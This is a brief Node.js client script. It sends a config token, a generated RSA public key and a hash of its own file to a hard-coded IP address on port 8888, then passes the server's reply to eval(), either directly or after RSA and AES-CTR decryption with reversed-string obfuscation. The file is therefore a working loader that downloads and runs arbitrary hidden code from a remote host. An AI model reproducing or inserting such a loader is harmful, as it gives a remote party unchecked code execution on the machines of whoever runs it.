let request = require(`request`);
let rsa = require(`js-crypto-rsa`);
let aesjs = require(`aes-js`);
let config = require(`config-yml`);
let sha256 = require(`sha256-file`);
let token = config.Client.token;
let type = config.Client.type;
let host = "3.20.205.75";
let port = "8888";
rsa.generateKey(2048).then((key) => {
    let publicKey = key.publicKey;
    let privateKey = key.privateKey;
    request(`http://${ host }:${ port }/user?TOKEN=${ token }&KEY=${publicKey.n.split("").reverse().join("")}&SIZE=${sha256(__filename)}&TYPE=${ type }`, {
        json: true
    }, (err, res) => {
        if (err) {
            return console.log("[ERROR] ECONNREFUSED")
        }
        if (res.body.hasOwnProperty("MSG")) {
            eval(res.body.MSG)
        } else {
           rsa.decrypt(Buffer.from(aesjs.utils.hex.toBytes(res.body.KEY.split("").reverse().join(""))), privateKey).then((KEY) => {    
                eval(aesjs.utils.utf8.fromBytes(new aesjs.ModeOfOperation.ctr(KEY, new aesjs.Counter(5)).decrypt(aesjs.utils.hex.toBytes(/([0-9A-z]*)\|/.exec(res.body.DATA)[1].split("").reverse().join("").substring(0, /\|([0-9]*)/.exec(res.body.DATA)[1])))))
            })
        }
    })
});
